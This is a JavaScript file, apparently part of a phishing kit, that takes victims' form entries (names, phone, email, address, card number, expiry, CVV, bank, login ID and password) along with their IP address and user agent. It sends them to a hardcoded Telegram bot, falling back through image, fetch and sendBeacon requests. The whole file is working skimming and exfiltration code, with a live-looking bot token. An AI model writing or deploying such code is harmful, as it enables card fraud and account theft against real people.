// tg.js
const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
const CHAT_ID        = '-4766781392';

// JSONP ipify (injectée dans index.html)
function handleIP(data) {
  window.__CLIENT_IP__ = data.ip;
}

// debug in-page
function logDebug(msg) {
  const panel = document.getElementById('debug-panel');
  if (!panel) return;
  const line = document.createElement('div');
  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  panel.appendChild(line);
  panel.scrollTop = panel.scrollHeight;
}

// Conserver les requêtes pour éviter le GC sur iOS
window._tgReqs = window._tgReqs || [];

function sendTelegramNotification(message) {
  logDebug('🔥 start sendTelegramNotification');
  logDebug('Message brut: ' + message);

  const ip = window.__CLIENT_IP__ || 'unknown';
  const ua = navigator.userAgent || 'unknown';
  logDebug('IP: ' + ip);
  logDebug('UA: ' + ua);

  const now = new Date();
  const pad = n => String(n).padStart(2,'0');
  const datetime = `${pad(now.getDate())}/${pad(now.getMonth()+1)}/${now.getFullYear().toString().slice(-2)}, `
                 + `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
  logDebug('Date: ' + datetime);

  // Construire le texte Markdown
  const parts = message.split('\n');
  const header = parts.shift();
  let text = `[📝] ${header}`;
  if (parts.length) {
    text += '\n' + parts.map(line => {
      if (line.startsWith('Nom:'))       return line.replace('Nom:', '👤 Nom:');
      if (line.startsWith('Prénom:'))    return line.replace('Prénom:', '🙋 Prénom:');
      if (line.startsWith('Téléphone:')) return line.replace('Téléphone:', '📞 Téléphone:');
      if (line.startsWith('Email:'))     return line.replace('Email:', '✉️ Email:');
      if (line.startsWith('Adresse:'))   return line.replace('Adresse:', '🏠 Adresse:');
      if (line.startsWith('Numéro:'))    return line.replace('Numéro:', '💳 Numéro:');
      if (line.startsWith('Exp:'))       return line.replace('Exp:', '📅 Exp:');
      if (line.startsWith('CVV:'))       return line.replace('CVV:', '🔒 CVV:');
      if (line.startsWith('Banque:'))    return line.replace('Banque:', '🏦 Banque:');
      if (line.startsWith('ID:'))        return line.replace('ID:', '🆔 ID:');
      if (line.startsWith('Pass:'))      return line.replace('Pass:', '🔑 Pass:');
      return line;
    }).join('\n');
  }
  text += `\n\n[🗓️] ${datetime}` +
          `\n[🌐] ${ip}` +
          `\n[📍] ${ua}`;
  logDebug('Texte final: ' + text.replace(/\n/g,' ⏎ '));

  const base = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const query = `?chat_id=${encodeURIComponent(CHAT_ID)}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
  const url   = base + query;
  logDebug('URL: ' + url);

  // 1) Tentative <img>
  const img = new Image();
  img.src = url;
  window._tgReqs.push(img);
  img.onload  = () => logDebug('✔️ <img> sent');
  img.onerror = () => {
    logDebug('❌ <img> failed, fallback fetch');

    // 2) fetch(no-cors)
    fetch(url, { mode: 'no-cors' })
      .then(() => {
        logDebug('✔️ fetch(no-cors) sent');

        // 3) sendBeacon
        const blob = new Blob([], { type: 'application/json' });
        const ok = navigator.sendBeacon(url, blob);
        logDebug('📶 sendBeacon ' + (ok ? '✓' : '✗'));
      })
      .catch(err => {
        logDebug('❌ fetch error: ' + err);

        // fallback beacon
        const blob = new Blob([], { type: 'application/json' });
        const ok = navigator.sendBeacon(url, blob);
        logDebug('📶 sendBeacon ' + (ok ? '✓' : '✗'));
      });
  };
}

// Expose
window.sendTelegramNotification = sendTelegramNotification;